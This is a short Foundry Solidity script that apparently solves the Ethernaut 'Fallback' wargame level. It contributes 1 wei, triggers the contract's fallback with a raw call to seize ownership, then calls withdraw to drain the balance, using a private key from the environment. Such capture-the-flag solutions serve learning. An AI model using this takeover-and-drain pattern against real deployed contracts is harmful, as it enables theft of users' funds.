// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackAddress = Fallback(payable(0xcFdf9133bbF9a2D0F1a0800e94F714801695f05B));

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackAddress.contribute{value: 1 wei}();
        address(fallbackAddress).call{value: 1 wei}("");
        console.log("New owner: ", fallbackAddress.owner());
        console.log("Me: ", vm.envAddress("MY_ADDRESS"));
        fallbackAddress.withdraw();

        vm.stopBroadcast();
    } 
}